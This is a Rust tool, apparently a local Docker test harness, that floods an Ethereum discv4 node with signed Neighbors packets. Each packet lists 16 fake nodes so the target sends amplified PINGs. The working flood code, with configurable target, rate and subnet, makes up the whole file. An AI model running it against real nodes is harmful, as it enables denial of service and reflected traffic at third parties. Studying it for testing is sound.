use std::env;
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use ethrex_common::H512;
use ethrex_p2p::discv4::messages::{Message, NeighborsMessage};
use ethrex_p2p::types::Node;
use rand::Rng;
use secp256k1::SecretKey;

fn random_node(rng: &mut impl Rng, subnet: &str) -> Node {
    // Generate IPs within the Docker bridge subnet (e.g. "10.55.0") so that
    // the amplified PINGs stay on the local bridge and don't leak to the
    // host's real network.
    let parts: Vec<u8> = subnet
        .split('.')
        .map(|s| s.parse().expect("invalid subnet octet"))
        .collect();
    let ip = match parts.len() {
        3 => Ipv4Addr::new(parts[0], parts[1], parts[2], rng.gen_range(100..=254)),
        _ => panic!("subnet must be 3 octets like '10.55.0'"),
    };
    let mut pubkey_bytes = [0u8; 64];
    rng.fill(&mut pubkey_bytes);
    let pubkey = H512::from_slice(&pubkey_bytes);
    Node::new(ip.into(), 30303, 30303, pubkey)
}

fn build_neighbors_packet(signer: &SecretKey, rng: &mut impl Rng, subnet: &str) -> Vec<u8> {
    let nodes: Vec<Node> = (0..16).map(|_| random_node(rng, subnet)).collect();
    let expiration = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs()
        + 3600;

    let msg = Message::Neighbors(NeighborsMessage::new(nodes, expiration));
    let mut buf = Vec::with_capacity(1280);
    msg.encode_with_header(&mut buf, signer);
    buf
}

fn main() {
    let target_ip = env::args().nth(1).unwrap_or_else(|| "10.55.0.10".into());
    let target_port: u16 = env::args()
        .nth(2)
        .and_then(|s| s.parse().ok())
        .unwrap_or(30303);
    let pps: u64 = env::args()
        .nth(3)
        .and_then(|s| s.parse().ok())
        .unwrap_or(200);
    // Subnet for fake node IPs — must match the Docker bridge so PINGs stay local
    let subnet = env::args()
        .nth(4)
        .unwrap_or_else(|| "10.55.0".into());

    let target: SocketAddr = format!("{target_ip}:{target_port}").parse().unwrap();

    eprintln!("Flooding {target} with Neighbors packets at {pps} pps");
    eprintln!("Fake node IPs in {subnet}.x — PINGs stay on the bridge");
    eprintln!("Each packet has 16 fake nodes → expected {} PINGs/sec from target", pps * 16);

    let mut rng = rand::thread_rng();
    let signer = SecretKey::new(&mut rng);
    let sock = UdpSocket::bind("0.0.0.0:0").unwrap();

    let interval = Duration::from_secs_f64(1.0 / pps as f64);
    let start = Instant::now();
    let mut sent: u64 = 0;

    loop {
        let packet = build_neighbors_packet(&signer, &mut rng, &subnet);
        if let Err(e) = sock.send_to(&packet, target) {
            eprintln!("send error: {e}");
        }
        sent += 1;

        // Log every 5 seconds
        if sent % (pps * 5) == 0 {
            let elapsed = start.elapsed().as_secs_f64();
            eprintln!("  sent={sent}  elapsed={elapsed:.1}s  actual_pps={:.1}", sent as f64 / elapsed);
        }

        // Maintain target rate
        let expected = start + interval * sent as u32;
        let now = Instant::now();
        if now < expected {
            std::thread::sleep(expected - now);
        }
    }
}
